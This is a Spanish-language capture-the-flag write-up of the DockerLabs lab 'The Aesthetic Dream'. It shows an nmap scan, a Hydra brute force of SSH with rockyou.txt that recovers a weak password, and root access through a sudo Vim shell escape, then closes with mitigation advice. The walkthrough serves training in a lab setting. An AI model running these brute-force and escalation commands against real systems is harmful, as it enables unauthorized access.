Writeup: The Aesthetic Dream (DockerLabs)
Autor: Raúl Lozano Fernández
Plataforma: DockerLabs
Dificultad: Fácil
Vulnerabilidad Principal: Fuga de información en HTML, credenciales débiles y escalada mediante Vim (Sudo NOPASSWD)

1. Objetivo del Laboratorio
Comprometer la máquina vulnerable (IP: 172.17.0.3) realizando reconocimiento web, identificando comentarios ocultos en el código fuente, obteniendo acceso por fuerza bruta al servicio SSH y explotando manualmente los permisos de sudo para obtener acceso de administrador (root) y capturar la bandera.

2. Reconocimiento y Escaneo
El primer paso consistió en descubrir los puertos abiertos en la máquina víctima utilizando Nmap.

Escaneo de descubrimiento y versiones
Se ejecutó un escaneo rápido para identificar los puertos y servicios expuestos:
nmap -p- --open -sS -sCV --min-rate 5000 -n -Pn 172.17.0.3

Explicación de parámetros:
-p-: Escanea todos los puertos (del 1 al 65535).
--open: Solo muestra los puertos que están abiertos.
-sS: TCP SYN Scan (escaneo sigiloso).
-sCV: Lanza scripts básicos y detecta la versión exacta de los servicios.
--min-rate 5000: Agiliza el proceso de escaneo.
-n y -Pn: Omite la resolución DNS y el descubrimiento de host.

Resultados de Nmap:
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH
80/tcp open  http    Apache/2.4.58 (Ubuntu)

3. Análisis de Vulnerabilidad
Al inspeccionar el servicio HTTP (puerto 80), descubrimos el portal "Russoski Coaching". Analizando el código fuente de la página, se detectó un comentario oculto del desarrollador que sugería una política de reutilización de credenciales. Además, esto apuntaba a que el puerto 22 era un vector viable para un ataque de fuerza bruta.
Posteriormente, identificamos que el usuario de bajos privilegios podía ejecutar `/usr/bin/vim` como administrador sin contraseña. Vim posee una característica interna (Shell escape) que permite ejecutar comandos del sistema, lo cual es una vulnerabilidad crítica de escalada si se ejecuta con sudo.

4. Explotación
Paso 1: Fuerza Bruta a SSH
Ante la pista sobre la seguridad deficiente en las contraseñas, utilizamos Hydra y el diccionario masivo rockyou.txt para atacar el puerto 22:
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.3 -t 4

Resultado exitoso:
login: russoski   password: iloveme

Paso 2: Conexión SSH
Nos conectamos al sistema con las credenciales descubiertas:
ssh russoski@172.17.0.3

5. Post-Explotación y Captura de Bandera
Con acceso inicial al sistema operativo, enumeramos nuestros permisos de administrador:
sudo -l
# Resultado: (root) NOPASSWD: /usr/bin/vim

Para explotar esta mala configuración (aplicando técnicas de GTFOBins), ejecutamos Vim pasándole por argumento el comando para abrir una consola interactiva:
sudo /usr/bin/vim -c ':!/bin/bash'

Verificamos nuestros privilegios en la nueva consola, confirmando que heredamos los permisos máximos:
whoami
# Resultado: root

Finalmente, procedimos a leer la bandera de administrador:
cat /root/root.txt

La máquina fue comprometida en su totalidad.

6. Mitigación Recomendada
Para solucionar estas vulnerabilidades críticas, se debe:
- Sanitización de código: Eliminar por completo los comentarios de desarrollo (<!-- -->) en el HTML antes del paso a producción para evitar la Fuga de Información (Information Disclosure).
- Políticas de Contraseñas: Reforzar el servicio SSH deshabilitando la autenticación por contraseña tradicional y exigiendo el uso de claves criptográficas (SSH Keys).
- Restricción de Sudoers: Eliminar la directiva NOPASSWD para /usr/bin/vim. Si un usuario requiere editar archivos del sistema, se debe configurar estrictamente la utilidad segura sudoedit.